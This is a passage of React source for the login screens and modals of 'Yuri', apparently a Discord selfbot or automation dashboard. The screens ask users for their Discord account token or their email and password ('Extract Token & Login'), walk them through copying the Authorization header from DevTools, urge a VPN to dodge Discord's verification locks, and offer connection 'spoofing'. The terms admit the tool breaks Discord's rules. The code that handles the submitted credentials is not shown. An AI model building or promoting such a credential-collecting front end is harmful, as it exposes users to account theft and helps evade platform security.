                <div className="space-y-5">
                  <div className="p-3.5 rounded-xl bg-amber-500/10 border border-amber-500/20 text-amber-200 text-xs leading-relaxed">
                    <p className="font-semibold text-amber-400 mb-1">⚠️ Note on OAuth:</p>
                    <p>
                      OAuth provides dashboard viewing access. Full Discord client automation, RPC customization, and gateway voice operations require an account Token.
                    </p>
                  </div>

                  <button
                    onClick={handleDiscordLogin}
                    className="w-full py-3.5 bg-indigo-600 hover:bg-indigo-500 text-white font-medium text-sm rounded-xl transition-all flex items-center justify-center gap-2.5 shadow-lg shadow-indigo-950/40 cursor-pointer"
                  >
                    <span>Authorize with Discord OAuth</span>
                  </button>
                  {error && (
                    <div className="text-red-400 text-xs text-center font-medium bg-red-400/10 py-2 rounded-lg border border-red-400/20">{error}</div>
                  )}
                </div>
              ) : activeTab === 'login' ? (
                <form onSubmit={handleTokenSubmit} className="space-y-4">
                  <div>
                    <input
                      type="password"
                      value={token}
                      onChange={(e) => setToken(e.target.value)}
                      placeholder="Discord Account Token"
                      className="w-full px-4 py-3.5 bg-zinc-900 border border-white/10 rounded-xl focus:outline-none focus:border-red-500/50 transition-all placeholder:text-zinc-600 text-white text-sm font-mono"
                      required
                    />
                  </div>

                  {error && (
                    <div className="text-red-400 text-xs text-center font-medium bg-red-400/10 py-2 rounded-lg border border-red-400/20">{error}</div>
                  )}

                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-3.5 bg-red-600 hover:bg-red-500 text-white font-semibold text-sm rounded-xl transition-all disabled:opacity-50 cursor-pointer shadow-lg shadow-red-950/40"
                  >
                    {loading ? 'Authenticating...' : 'Enter Yuri Dashboard'}
                  </button>
                </form>
              ) : activeTab === 'email' ? (
                <form onSubmit={handleEmailSubmit} className="space-y-4">
                  <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-3 flex gap-2.5 text-red-200">
                    <ShieldAlert className="w-4 h-4 shrink-0 text-red-400 mt-0.5" />
                    <div className="text-xs">
                      <p className="font-semibold text-red-400">VPN Recommended:</p>
                      <p>Enable VPN before logging in with email/password to prevent Discord verification lock.</p>
                    </div>
                  </div>

                  <div className="space-y-3">
                    <input
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Discord Email"
                      className="w-full px-4 py-3 bg-zinc-900 border border-white/10 rounded-xl focus:outline-none focus:border-red-500/50 transition-all placeholder:text-zinc-600 text-white text-sm"
                      required
                    />
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Discord Password"
                      className="w-full px-4 py-3 bg-zinc-900 border border-white/10 rounded-xl focus:outline-none focus:border-red-500/50 transition-all placeholder:text-zinc-600 text-white text-sm"
                      required
                    />
                  </div>

                  {copySuccess && (
                    <div className="text-emerald-400 text-xs text-center font-medium bg-emerald-500/10 py-2 px-3 rounded-lg border border-emerald-500/20 flex items-center justify-center gap-2">
                      <Check className="w-3.5 h-3.5" />
                      <span>Token extracted &amp; copied! Logging in...</span>
                    </div>
                  )}

                  {error && (
                    <div className="text-red-400 text-xs text-center font-medium bg-red-400/10 py-2 rounded-lg border border-red-400/20">{error}</div>
                  )}

                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-3.5 bg-red-600 hover:bg-red-500 text-white font-semibold text-sm rounded-xl transition-all disabled:opacity-50 cursor-pointer shadow-lg shadow-red-950/40 flex items-center justify-center gap-2"
                  >
                    {loading && <span className="w-3.5 h-3.5 border-2 border-white/20 border-t-white rounded-full animate-spin"/>}
                    <span>{loading ? 'Extracting & Logging in...' : 'Extract Token & Login'}</span>
                  </button>
                </form>
              ) : (
                <div className="space-y-4 text-xs text-zinc-400 bg-black/40 p-4 rounded-xl border border-white/5">
                  <p className="font-semibold text-white text-sm">How to get your Discord token:</p>
                  <ol className="list-decimal list-outside ml-4 space-y-2 font-sans">
                    <li>Open Discord in your browser and sign in.</li>
                    <li>Press <code className="bg-zinc-800 text-zinc-200 px-1 py-0.5 rounded font-mono">Ctrl + Shift + I</code> to open DevTools.</li>
                    <li>Click the <span className="text-zinc-200 font-medium">Network</span> tab.</li>
                    <li>Press <code className="bg-zinc-800 text-zinc-200 px-1 py-0.5 rounded font-mono">F5</code> to reload.</li>
                    <li>Filter by <code className="bg-zinc-800 text-red-300 px-1 py-0.5 rounded font-mono">/api/v9/users/@me</code>.</li>
                    <li>Select the request and find <span className="text-zinc-200 font-medium">Authorization</span> under Request Headers.</li>
                  </ol>
                </div>
              )}

              {/* TOS Checkbox */}
              <div className="mt-6 pt-4 border-t border-white/5">
                <label className="flex items-center gap-2.5 cursor-pointer group">
                  <div className="relative flex items-center justify-center">
                    <input 
                      type="checkbox" 
                      className="sr-only" 
                      checked={termsAccepted}
                      onChange={(e) => handleAcceptTerms(e.target.checked)}
                    />
                    <div className={`w-4 h-4 rounded border flex items-center justify-center transition-all ${termsAccepted ? 'bg-red-600 border-red-600' : 'bg-black/40 border-white/20 group-hover:border-white/40'}`}>
                      {termsAccepted && <Check className="w-3 h-3 text-white" />}
                    </div>
                  </div>
                  <p className="text-[11px] text-zinc-400 select-none">
                    I agree to Yuri's <button type="button" onClick={(e) => { e.preventDefault(); setShowTermsModal(true); }} className="text-zinc-300 hover:text-white underline transition-colors cursor-pointer">Terms of Service</button> and <button type="button" onClick={(e) => { e.preventDefault(); setShowPrivacyModal(true); }} className="text-zinc-300 hover:text-white underline transition-colors cursor-pointer">Privacy Policy</button>.
                  </p>
                </label>
              </div>

              <div className="mt-4 text-center">
                <button
                  type="button"
                  onClick={() => setShowAuthModal(false)}
                  className="text-xs text-zinc-500 hover:text-zinc-300 transition-colors cursor-pointer"
                >
                  ← Return to Overview
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Terms Modal */}
      <AnimatePresence>
        {showTermsModal && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/70 backdrop-blur-md"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-lg bg-zinc-950 border border-white/10 rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[80vh]"
            >
              <div className="p-5 border-b border-white/5 flex items-center justify-between">
                <h3 className="text-lg font-semibold text-white">Terms of Service</h3>
                <button onClick={() => setShowTermsModal(false)} className="p-1.5 text-zinc-400 hover:text-white transition-colors bg-white/5 rounded-lg cursor-pointer">
                  <X className="w-4 h-4" />
                </button>
              </div>
              <div className="p-6 overflow-y-auto text-xs text-zinc-300 leading-relaxed custom-scrollbar space-y-3">
                <p>
                  <strong>1. Acceptance of Terms:</strong> By accessing or using Yuri, you confirm that you have read, understood, and agreed to be bound by these Terms of Service.
                </p>
                <p>
                  <strong>2. Use of Service:</strong> Yuri is provided as a third-party application dashboard. You agree to use the service responsibly and in compliance with all applicable local, national, and international laws.
                </p>
                <p>
                  <strong>3. Interaction with Discord API and Potential Risks:</strong> Third-party clients and automation functionalities are strictly against Discord's Terms of Service. You acknowledge that you use Yuri at your entirely own personal risk.
                </p>
                <p>
                  <strong>4. Local Processing:</strong> Tokens are processed locally in your session and never stored or broadcast to remote third-party servers.
                </p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Privacy Policy Modal */}
      <AnimatePresence>
        {showPrivacyModal && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/70 backdrop-blur-md"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-lg bg-zinc-950 border border-white/10 rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[80vh]"
            >
              <div className="p-5 border-b border-white/5 flex items-center justify-between">
                <h3 className="text-lg font-semibold text-white">Privacy Policy</h3>
                <button onClick={() => setShowPrivacyModal(false)} className="p-1.5 text-zinc-400 hover:text-white transition-colors bg-white/5 rounded-lg cursor-pointer">
                  <X className="w-4 h-4" />
                </button>
              </div>
              <div className="p-6 overflow-y-auto text-xs text-zinc-300 leading-relaxed custom-scrollbar space-y-3">
                <p>
                  <strong>1. Data Collection:</strong> When you use Yuri and authenticate, your Discord token is stored entirely locally on your device within your browser's local storage or memory. We do not transmit tokens to any third-party databases.
                </p>
                <p>
                  <strong>2. Data Usage:</strong> Your tokens are strictly used to authenticate your session directly with the Discord API to enable the features within the Yuri dashboard.
                </p>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* VPN Modal */}
      <AnimatePresence>
        {showVpnModal && (
          <motion.div 
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-md"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-md bg-zinc-950 border border-white/10 rounded-2xl shadow-2xl overflow-hidden flex flex-col max-h-[80vh]"
            >
              <div className="p-5 border-b border-white/5 flex items-center justify-between">
                <div className="flex items-center gap-2.5">
                  <div className="w-8 h-8 rounded-full bg-red-500/20 flex items-center justify-center text-red-400">
                    <Globe className="w-4 h-4" />
                  </div>
                  <div>
                    <h3 className="text-sm font-semibold text-white">Yuri Routing Shield</h3>
                    <p className="text-[11px] text-zinc-400">Spoof connection node &amp; gateway</p>
                  </div>
                </div>
                <button onClick={() => setShowVpnModal(false)} className="p-1.5 text-zinc-400 hover:text-white bg-white/5 rounded-lg cursor-pointer">
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div className="p-5 space-y-3 overflow-y-auto custom-scrollbar">
                <div className="relative">
                  <Search className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-1/2 -translate-y-1/2" />
                  <input
                    type="text"
                    value={vpnSearch}
                    onChange={(e) => setVpnSearch(e.target.value)}
                    placeholder="Search locations..."
                    className="w-full bg-zinc-900 border border-white/10 rounded-xl py-2.5 pl-9 pr-4 text-xs text-zinc-200 focus:outline-none focus:border-red-500/50"
                  />
                </div>

                <div className="space-y-1.5">
                  {VPN_COUNTRIES.filter(c => c.name.toLowerCase().includes(vpnSearch.toLowerCase()) || c.id.toLowerCase().includes(vpnSearch.toLowerCase())).map((country) => (
                    <button
                      key={country.id}
                      onClick={() => setVpnCountry(country)}
                      className={`w-full flex items-center justify-between p-2.5 rounded-xl border transition-all cursor-pointer ${
                        vpnCountry.id === country.id 
                          ? 'bg-red-500/10 border-red-500/30' 
                          : 'bg-zinc-900/60 border-transparent hover:bg-zinc-800'
                      }`}
                    >
                      <div className="flex items-center gap-2.5">
                        <span className="text-lg">{country.flag}</span>
                        <span className="text-xs font-medium text-zinc-200">{country.name}</span>
                      </div>
                      <div className="flex items-center gap-2.5">
                        <span className="text-[11px] text-zinc-500 font-mono">{country.latency}</span>
                        <div className={`w-2.5 h-2.5 rounded-full border-2 ${vpnCountry.id === country.id ? 'border-red-500 bg-red-500' : 'border-zinc-700'}`} />
                      </div>
                    </button>
                  ))}
                </div>
              </div>

              <div className="p-4 border-t border-white/5 bg-zinc-900/50">
                <button
                  onClick={() => {
                    setVpnEnabled(!vpnEnabled);
                    if (!vpnEnabled) setTimeout(() => setShowVpnModal(false), 500);
                  }}
                  className={`w-full py-3 rounded-xl font-semibold text-xs flex items-center justify-center gap-2 transition-all cursor-pointer ${
                    vpnEnabled 
                      ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' 
                      : 'bg-red-600 text-white hover:bg-red-500'
                  }`}
                >
                  <Shield className="w-4 h-4" />
                  {vpnEnabled ? 'Connected via ' + vpnCountry.name : 'Activate Node Shield'}
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Community Server Modal */}
      <AnimatePresence>
        {showCommunityModal && (
          <motion.div 
            initial={{ opacity: 0 }} 
            animate={{ opacity: 1 }} 
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-md"
          >
            <motion.div 
              initial={{ scale: 0.95, y: 20 }} 
              animate={{ scale: 1, y: 0 }} 
              exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-md bg-zinc-950 border border-[#5865F2]/20 rounded-3xl shadow-2xl overflow-hidden flex flex-col relative p-6 text-center"
            >
              <button 
                onClick={() => setShowCommunityModal(false)} 
                className="absolute top-4 right-4 p-1.5 text-zinc-400 hover:text-white bg-white/5 rounded-full cursor-pointer"
              >
                <X className="w-4 h-4" />
              </button>

              <div className="w-16 h-16 mx-auto rounded-2xl bg-[#5865F2]/20 border border-[#5865F2]/40 flex items-center justify-center text-[#5865F2] mb-4">
                <MessageSquare className="w-8 h-8" />
              </div>

              <h3 className="text-xl font-bold text-white mb-1">Official Yuri Community</h3>
              <p className="text-xs text-zinc-400 mb-6 max-w-xs mx-auto">
                Join our private community for Lua script drops, fast-track whitelisting, and real-time announcements.
              </p>

              <button
                onClick={handleCopyCommunityLink}
                className={`w-full py-3.5 rounded-xl font-semibold text-xs flex items-center justify-center gap-2 transition-all cursor-pointer ${
                  communityCopied 
                    ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30' 
                    : 'bg-[#5865F2] text-white hover:bg-[#4752C4]'
                }`}
              >
                {communityCopied ? (
                  <>
                    <Check className="w-4 h-4 text-emerald-400" />
                    <span>Copied &amp; Opening Server!</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4" />
                    <span>Copy Link &amp; Join Discord</span>
                  </>
                )}
              </button>

              <div className="mt-4 text-[11px] font-mono text-zinc-500">
                discord.gg/eaEB3q7pEb
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
